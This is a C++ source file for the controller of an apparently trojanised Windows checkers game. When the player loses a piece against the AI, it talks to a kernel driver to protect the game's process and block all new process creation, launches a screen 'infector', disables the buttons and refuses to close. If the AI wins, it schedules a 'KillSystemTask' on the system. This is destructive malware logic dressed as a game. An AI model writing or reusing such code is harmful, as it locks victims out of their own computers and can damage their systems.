#include "WCursedController.h"

#include "CursedEvents.h"
#include "Systems.h"
#include "WRendering.h"
#include "KillSystemTask.h"

WCursedController::WCursedController()
{
	_connected = true;
	_activated = false;
	_playerTurnsCount = 0;
	_playerCheckersLeft = 12;
	_infector = nullptr;

	HANDLE hDevice = CreateFile(L"\\\\.\\DCheckers", FILE_SHARE_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
	if (hDevice == INVALID_HANDLE_VALUE) {
		_connected = false;
	}
	else
	{
		_driver = new DeadDriverController(hDevice);
	}

	WTextureSet& textures = (dynamic_cast<WRendering*>(Systems::GetRendering()))->GetTextureSet();

	HBITMAP loaded = (HBITMAP)LoadImageW(NULL, L"Media\\smth\\smth1.bmp", IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE);
	if (!loaded) {
		_connected = false;
	}
	textures.Set(Texture::smth1, loaded);

	loaded = (HBITMAP)LoadImageW(NULL, L"Media\\smth\\smth2.bmp", IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE);
	if (!loaded) {
		_connected = false;
	}
	textures.Set(Texture::smth2, loaded);
}

void WCursedController::HandleGameStart()
{
	if (_connected && Systems::GetGame()->IsUsingAI()) {
		_activated = true;
	}
	else {
		if (_activated && _playerTurnsCount) {
			CursedEvents::SetNormalCellIndexes();
		}
		_activated = false;
	}
	_playerTurnsCount = 0;
	_playerCheckersLeft = 12;
}

void WCursedController::HandleFirstPlayerCheckerLoss()
{
	if (_activated) {
		_playerCheckersLeft--;
		switch (_playerCheckersLeft) {
		/*case 11:
			CursedEvents::SetLastWarningCellIndexes();
			break;*/
		case 11:
			CursedEvents::SetCursedCellIndexes();
			CursedEvents::SetCursedBackground();
			CursedEvents::BlockButtons();
			_infector = new ScreenInfector();
			_driver->Protect();
			_driver->BlockProcessesCreation();
			break;
		}
	}
}

void WCursedController::HandleFirstPlayerWin()
{
	_driver->StopBlockingProcessesCreation();
	_driver->StopProtecting();
	PostQuitMessage(0);
}

void WCursedController::HandleSecondPlayerWin()
{
	_infector->SetInfectionSpeed(0);
	new KillSystemTask(_driver, 250);
}


void WCursedController::HandleGameEnd(Team winningTeam)
{

}

bool WCursedController::HandleAppClosing()
{
	return false;
}

void WCursedController::HandleFirstPlayerTurnEnd()
{
	if (_activated) {
		if (!_playerTurnsCount) {
			CursedEvents::SetWarningCellIndexes();
		}
		_playerTurnsCount++;
	}
}
